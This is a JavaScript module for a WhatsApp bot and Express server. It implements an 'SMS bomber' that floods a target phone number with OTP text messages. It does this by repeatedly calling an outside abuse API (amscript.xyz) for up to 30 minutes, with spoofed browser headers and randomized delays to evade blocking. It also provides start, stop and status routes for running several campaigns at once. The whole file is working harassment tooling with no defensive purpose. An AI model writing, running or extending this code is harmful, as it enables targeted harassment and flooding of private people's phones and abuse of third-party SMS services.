// ============================================================
// MODULE: smsbomber.js
// WhatsApp Bot command: .smsbomber <phone_number> [qty]
// SMS bombing via Ahmad Mods X public OTP API
// Endpoint: https://amscript.xyz/PublicApi/sms.php?qty=N&phone=923xxxxxxxx
// ============================================================

const express = require('express');
const crypto = require('crypto');
const EventEmitter = require('events');
const axios = require('axios');

// ---------- CONFIGURATION ----------
const SMS_BOMBER_API_URL = process.env.SMS_BOMBER_API_URL || 'https://amscript.xyz/PublicApi/sms.php';
const DEFAULT_QTY = 100;
const DEFAULT_DURATION_MINUTES = 30;
const REQUEST_DELAY_MIN_MS = 10000;
const REQUEST_DELAY_MAX_MS = 25000;
const API_TIMEOUT_MS = 60000;
const MAX_QTY = 500; // Hard cap to avoid burning API / getting blocked

// ---------- STATE ----------
const activeSmsCampaigns = new Map();

class SmsBomber extends EventEmitter {
  constructor(phoneNumber, durationMinutes = DEFAULT_DURATION_MINUTES, qty = DEFAULT_QTY) {
    super();
    this.phone = String(phoneNumber || '').replace(/\D/g, '');
    this.durationMs = (parseInt(durationMinutes, 10) || DEFAULT_DURATION_MINUTES) * 60 * 1000;
    this.qty = Math.min(Math.max(parseInt(qty, 10) || DEFAULT_QTY, 1), MAX_QTY);
    this.stopFlag = false;
    this.stats = { attempts: 0, success: 0, errors: 0 };
    this.sessionId = crypto.randomBytes(8).toString('hex');
    this._runLoop = this._runLoop.bind(this);
  }

  _sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  _randomDelay() {
    return Math.floor(Math.random() * (REQUEST_DELAY_MAX_MS - REQUEST_DELAY_MIN_MS + 1)) + REQUEST_DELAY_MIN_MS;
  }

  // ---------- SINGLE API CALL ----------
  async _callApi() {
    if (!this.phone || this.phone.length < 10) {
      return {
        api: 'AhmadModsX',
        status: 0,
        success: false,
        sent: 0,
        failed: 0,
        total: 0,
        body: 'invalid phone number'
      };
    }

    const url = `${SMS_BOMBER_API_URL}?qty=${this.qty}&phone=${encodeURIComponent(this.phone)}`;

    try {
      const response = await axios.get(url, {
        timeout: API_TIMEOUT_MS,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
          'Accept': 'application/json, text/plain, */*',
          'Accept-Language': 'en-US,en;q=0.9,ur;q=0.8',
          'Referer': 'https://amscript.xyz/'
        },
        validateStatus: (status) => status < 600, // Allow 2xx/4xx/5xx - we parse response
        maxRedirects: 5
      });

      const data = response.data;
      let sent = 0;
      let failed = 0;

      if (data && typeof data === 'object') {
        sent = parseInt(data.summary?.sent, 10) || 0;
        failed = parseInt(data.summary?.failed, 10) || 0;
      }

      const total = sent + failed;
      const success = sent > 0;

      return {
        api: 'AhmadModsX',
        status: response.status,
        success,
        sent,
        failed,
        total,
        body: typeof data === 'string' ? data.slice(0, 200) : JSON.stringify(data).slice(0, 200)
      };
    } catch (error) {
      return {
        api: 'AhmadModsX',
        status: 0,
        success: false,
        sent: 0,
        failed: 0,
        total: 0,
        body: error.message || 'connection error'
      };
    }
  }

  // ---------- MAIN LOOP ----------
  async _runLoop() {
    const startTime = Date.now();
    this.emit('start', { phone: this.phone, duration: this.durationMs, qty: this.qty });
    let lastLogTime = 0;
    let lastProgressAttempts = 0;

    while (!this.stopFlag && (Date.now() - startTime) < this.durationMs) {
      try {
        const result = await this._callApi();

        // Update stats using the API's own sent/failed summary
        this.stats.attempts += result.total || 1;
        this.stats.success += result.sent;
        this.stats.errors += result.failed;

        const now = Date.now();
        if (this.stats.attempts <= 10 || (now - lastLogTime > 30000)) {
          console.log(`[SMSBomber] #${this.stats.attempts} AhmadModsX → sent:${result.sent} failed:${result.failed} status:${result.status}`);
          lastLogTime = now;
        }
      } catch (err) {
        this.stats.errors++;
        console.error('[SMSBomber] error:', err.message);
      }

      // Emit progress every ~10 attempts or every call once attempts exceed 10
      if (this.stats.attempts - lastProgressAttempts >= 10 || this.stats.attempts <= 10) {
        this.emit('progress', {
          phone: this.phone,
          attempts: this.stats.attempts,
          success: this.stats.success,
          errors: this.stats.errors,
          elapsed: Math.round((Date.now() - startTime) / 1000)
        });
        lastProgressAttempts = this.stats.attempts;
      }

      await this._sleep(this._randomDelay());
    }

    this.emit('done', {
      phone: this.phone,
      totalAttempts: this.stats.attempts,
      totalSuccess: this.stats.success,
      totalErrors: this.stats.errors,
      durationSeconds: Math.round((Date.now() - startTime) / 1000)
    });
  }

  start() {
    this.stopFlag = false;
    this._runLoop().catch(err => this.emit('error', { phone: this.phone, error: err.message }));
    return this;
  }

  stop() {
    this.stopFlag = true;
    this.emit('stopped', { phone: this.phone, stats: this.stats });
    return this;
  }

  getStats() {
    return { phone: this.phone, ...this.stats, running: !this.stopFlag };
  }
}

// ================================================================
// EXPRESS ROUTES
// ================================================================

const router = express.Router();

router.post('/start', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) return res.status(400).json({ error: 'Missing phoneNumber' });
  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (activeSmsCampaigns.has(cleanNumber)) {
    const campaign = activeSmsCampaigns.get(cleanNumber);
    return res.json({ status: 'already_running', phone: cleanNumber, stats: campaign.smsBomber.getStats() });
  }
  const qty = parseInt(req.body.qty, 10) || DEFAULT_QTY;
  const duration = parseInt(req.body.durationMinutes, 10) || DEFAULT_DURATION_MINUTES;
  const campaign = new SmsBomber(phoneNumber, duration, qty);
  activeSmsCampaigns.set(cleanNumber, { smsBomber: campaign, stats: campaign.stats, startTime: Date.now() });
  campaign.start();
  res.json({ status: 'started', phone: cleanNumber, sessionId: campaign.sessionId, qty: campaign.qty, durationMinutes: duration });
});

router.post('/stop', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) return res.status(400).json({ error: 'Missing phoneNumber' });
  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (!activeSmsCampaigns.has(cleanNumber)) return res.status(404).json({ error: 'No active SMS campaign for this number', phone: cleanNumber });
  const entry = activeSmsCampaigns.get(cleanNumber);
  entry.smsBomber.stop();
  activeSmsCampaigns.delete(cleanNumber);
  res.json({ status: 'stopped', phone: cleanNumber, stats: entry.smsBomber.getStats() });
});

router.get('/status', (req, res) => {
  if (activeSmsCampaigns.size === 0) return res.json({ campaigns: [] });
  const campaigns = [];
  for (const [phone, entry] of activeSmsCampaigns) {
    campaigns.push({ phone, stats: entry.smsBomber.getStats(), running: !entry.smsBomber.stopFlag, startedAt: entry.startTime });
  }
  res.json({ campaigns });
});

module.exports = router;
module.exports.SmsBomber = SmsBomber;
module.exports.activeSmsCampaigns = activeSmsCampaigns;
module.exports.DEFAULT_QTY = DEFAULT_QTY;
module.exports.DEFAULT_DURATION_MINUTES = DEFAULT_DURATION_MINUTES;
module.exports.MAX_QTY = MAX_QTY;
